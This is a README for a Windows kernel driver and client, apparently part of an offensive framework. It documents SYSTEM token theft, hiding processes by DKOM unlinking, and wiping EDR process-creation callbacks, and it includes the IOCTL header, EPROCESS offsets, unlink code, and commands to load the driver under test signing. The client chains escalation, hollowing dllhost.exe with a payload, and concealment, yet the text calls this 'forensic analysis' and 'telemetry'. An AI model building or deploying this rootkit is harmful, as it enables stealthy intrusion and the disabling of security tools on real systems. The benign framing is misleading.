# BYOVD — Kernel-Mode Driver Component

> A Windows kernel driver and user-mode client providing ring-0 access for deep system telemetry and kernel-level manipulation. Operates via IOCTL from user space, exposing process enumeration, privilege escalation, process concealment, and EDR callback removal.

---

## Overview

User-mode forensic analysis has a fundamental limitation: everything it can see, the system's security tooling can also see and block. Kernel callbacks, object handle auditing, and user-mode API hooks all operate above the level of what a user-space process can reliably bypass.

The BYOVD component operates at ring 0. By loading a kernel driver, the framework gains direct access to kernel data structures — the process list, the token array, the callback registration tables — with no mediation from user-mode security mechanisms.

The driver exposes its functionality through a device object and standard Windows IOCTL dispatch, keeping the user-mode client simple and the interface well-defined. The kernel operations themselves are implemented in the driver and are never exposed to user-mode scrutiny.

---

## Architecture

```
User mode                          Kernel mode (Ring 0)
┌─────────────────────────┐        ┌─────────────────────────────────────────┐
│  client.cpp             │        │  driver.c                               │
│                         │        │                                         │
│  CreateFileW(           │        │  DriverEntry()                          │
│    "\\\\.\\JockyDriver" │        │   → IoCreateDevice(\\Device\\JockyDriver)│
│  )                      │        │   → IoCreateSymbolicLink(\\DosDevices\\.)│
│         │               │        │                                         │
│         │ DeviceIoControl         │  IoControlRoutine()                     │
│         └──────────────►│──────► │   dispatches on IOCTL code:             │
│                         │        │                                         │
│  IOCTL_JOCKY_PING       │        │   PING            → STATUS_SUCCESS       │
│  IOCTL_JOCKY_ENUM_PROCS │        │   ENUM_PROCS      → ZwQuerySystemInfo    │
│  IOCTL_JOCKY_STEAL_TOKEN│        │   STEAL_TOKEN     → EPROCESS token copy  │
│  IOCTL_JOCKY_HIDE_PROCESS        │   HIDE_PROCESS    → DKOM unlink          │
│  IOCTL_JOCKY_REMOVE_CALLBACKS    │   REMOVE_CALLBACKS→ callback array zero  │
│                         │        │                                         │
└─────────────────────────┘        └─────────────────────────────────────────┘
```

---

## IOCTL Interface

Defined in `shared/ioctlcommon.h` and shared between driver and client:

```c
#define JOCKY_DEVICE_TYPE    0x8000
#define DEVICE_NAME_SYS      L"\\Device\\JockyDriver"
#define SYMBOLIC_LINK_NAME   L"\\DosDevices\\JockyDriver"
#define USER_MODE_PATH       L"\\\\.\\JockyDriver"

#define IOCTL_JOCKY_PING             CTL_CODE(JOCKY_DEVICE_TYPE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_JOCKY_REMOVE_CALLBACKS CTL_CODE(JOCKY_DEVICE_TYPE, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_JOCKY_HIDE_PROCESS     CTL_CODE(JOCKY_DEVICE_TYPE, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_JOCKY_STEAL_TOKEN      CTL_CODE(JOCKY_DEVICE_TYPE, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_JOCKY_ENUM_PROCS       CTL_CODE(JOCKY_DEVICE_TYPE, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _JOCKY_PID_INPUT {
    ULONG TargetPid;
} JOCKY_PID_INPUT;
```

---

## Kernel Operations

### IOCTL_JOCKY_PING

Connectivity and liveness check. The driver returns `STATUS_SUCCESS` immediately. Used by the client on startup to confirm the driver is loaded and the device handle is valid.

---

### IOCTL_JOCKY_ENUM_PROCS

Enumerates all running processes directly from the kernel using `ZwQuerySystemInformation(SystemProcessInformation)`. Unlike user-mode enumeration APIs (`EnumProcesses`, `CreateToolhelp32Snapshot`), this call runs at kernel privilege and is not subject to user-mode API hooking or DKOM-based hiding by competing drivers.

Returns a `PROCESS_LIST` structure containing up to `MAX_PROCESSES` entries, each with:
- `Pid` — process ID
- `ImageName` — truncated image name (first 15 characters)

The kernel allocates a 512 KB buffer for the query, iterates the `SYSTEM_PROCESS_INFO` linked list, and copies entries into the output buffer before freeing. The buffer is allocated from `NonPagedPool` with the pool tag `'kcoJ'`.

---

### IOCTL_JOCKY_STEAL_TOKEN

Performs privilege escalation to SYSTEM level via kernel token theft. The operation:

1. Calls `PsLookupProcessByProcessId(4)` to get the `EPROCESS` of the SYSTEM process (PID 4 is always `System` on Windows)
2. Calls `PsLookupProcessByProcessId(targetPid)` to get the `EPROCESS` of the target process
3. Reads the `Token` field from SYSTEM's `EPROCESS` at offset `0x4B8` (Windows 10 21H2)
4. Writes the SYSTEM token value (with reference-count bits masked off) into the target process's `Token` field at the same offset
5. Dereferences both `EPROCESS` objects via `ObDereferenceObject`

After this operation, the target process's access token is replaced with the SYSTEM token. Any subsequent privileged operations by that process run at SYSTEM integrity.

**Input:** `JOCKY_PID_INPUT` containing the target PID.

---

### IOCTL_JOCKY_HIDE_PROCESS

Removes a process from the Windows kernel's active process list using Direct Kernel Object Manipulation (DKOM). The operation:

1. Calls `PsLookupProcessByProcessId(targetPid)` to get the target `EPROCESS`
2. Locates the `ActiveProcessLinks` `LIST_ENTRY` within the `EPROCESS` at offset `0x448`
3. Unlinks the entry from the doubly-linked list:
   ```c
   entry->Blink->Flink = entry->Flink;
   entry->Flink->Blink = entry->Blink;
   entry->Flink = entry;
   entry->Blink = entry;
   ```
4. The entry now points to itself — it is no longer part of the global list

After this operation, the process continues running but is invisible to any enumeration that walks `PsActiveProcessLinks`. This includes Task Manager, Process Explorer, `EnumProcesses`, `NtQuerySystemInformation(SystemProcessInformation)`, and `ZwQuerySystemInformation` from user mode. The BYOVD driver's own `ENUM_PROCS` IOCTL also walks this list, so a hidden process will not appear there either.

**Input:** `JOCKY_PID_INPUT` containing the target PID.

---

### IOCTL_JOCKY_REMOVE_CALLBACKS *(currently disabled)*

Locates `PspCreateProcessNotifyRoutine` — the kernel's array of registered process-creation notification callbacks — and zeroes all populated slots. Security products register callbacks in this array to receive notification of every process creation event; zeroing the entries blinds them.

The driver locates the array by scanning `ntoskrnl.exe`'s `.text` section for the byte pattern `4C 8D 2D` (a `lea r13, [rip+offset]` instruction that references the array) and following the RIP-relative offset to the array base.

**Current status: disabled in the client.** The 3-byte scan pattern appears in multiple locations across the 16 MB kernel `.text` section, producing false positives. Zeroing the wrong slot causes an immediate kernel bugcheck (`DRIVER_CORRUPTED_EXPOOL` or similar). This IOCTL will be re-enabled once the array location method is replaced with a safer approach (symbol-based RVA lookup or a validated multi-byte pattern).

---

## EPROCESS Offsets

The driver uses hardcoded `EPROCESS` field offsets for Windows 10 21H2 (build 19044):

| Field | Offset |
|---|---|
| `EPROCESS.Token` | `0x4B8` |
| `EPROCESS.UniqueProcessId` | `0x440` |
| `EPROCESS.ActiveProcessLinks` | `0x448` |

These offsets must be updated for other Windows versions. They can be verified with WinDbg:

```
dt nt!_EPROCESS Token
dt nt!_EPROCESS UniqueProcessId
dt nt!_EPROCESS ActiveProcessLinks
```

---

## User-Mode Client

`client/client.cpp` opens a handle to `\\.\JockyDriver` via `CreateFileW` and invokes the driver's IOCTL operations in sequence:

```
1. Open handle to \\.\JockyDriver
2. IOCTL_JOCKY_PING               — verify driver connectivity
3. IOCTL_JOCKY_ENUM_PROCS         — enumerate all processes from kernel
4. IOCTL_JOCKY_STEAL_TOKEN        — escalate current process to SYSTEM
5. RunHollowPipeline()             — hollow dllhost.exe with payload
6. IOCTL_JOCKY_HIDE_PROCESS       — hide the hollowed PID from process list
```

After step 4, the client is running as SYSTEM. The hollowed `dllhost.exe` spawned in step 5 inherits this context. After step 6, the process is invisible to all user-mode enumeration and to the kernel's own `ZwQuerySystemInformation` path.

---

## Building

### Prerequisites

- Windows x64
- Visual Studio 2022
- Windows Driver Kit (WDK) — matching the Windows SDK version
- Test signing mode enabled (for development): `bcdedit /set testsigning on`

### Driver

Open `driver/driver.vcxproj` in Visual Studio. Build target: **x64 Release**.

The driver must be signed to load. For development, enable test signing and sign with a test certificate:

```powershell
# Enable test signing (requires reboot)
bcdedit /set testsigning on

# Sign with a self-signed test cert
signtool sign /fd SHA256 /a driver.sys
```

### Client

Open `client/client.vcxproj` in Visual Studio. Build target: **x64 Release**.

### Loading and running

```cmd
# Load the driver as a kernel service (requires Administrator)
sc create JockyDriver type= kernel binPath= C:\path\to\driver.sys
sc start JockyDriver

# Run the client
client.exe
```

### Unloading

```cmd
sc stop JockyDriver
sc delete JockyDriver
```

---

## Directory Layout

```
byovd/
├── shared/
│   └── ioctlcommon.h        IOCTL codes, device paths, and shared data structures
│                             (included by both driver and client)
│
├── driver/
│   ├── driver.c             Kernel-mode driver:
│   │                          - DriverEntry: device + symlink creation, dispatch table
│   │                          - IoControlRoutine: IOCTL dispatch
│   │                          - JockyHideProcess: DKOM process unlinking
│   │                          - JockyStealToken: EPROCESS token overwrite
│   │                          - JockyRemoveCallbacks: PspCreateProcessNotifyRoutine scan + zero
│   │                          - GetNtoskrnlBase / FindPspCreateProcessNotifyRoutine: pattern scan
│   └── driver.vcxproj       MSVC WDK project file
│
└── client/
    ├── client.cpp            User-mode IOCTL client: connect, enumerate, escalate, hollow, hide
    └── client.vcxproj        MSVC project file
```

---

## Relationship to Other Components

| Component | Relationship |
|---|---|
| `processhollowing/` | `client.cpp` calls `RunHollowPipeline()` from this module; the returned PID is passed to `IOCTL_JOCKY_HIDE_PROCESS` |
| `compiler/` | The payload binary loaded by `processhollowing/` is produced by the Polaris compiler pipeline |
| `endpoint-management-server/` | Results of kernel-level enumeration and telemetry are submitted to the management server via the agent's bearer token |
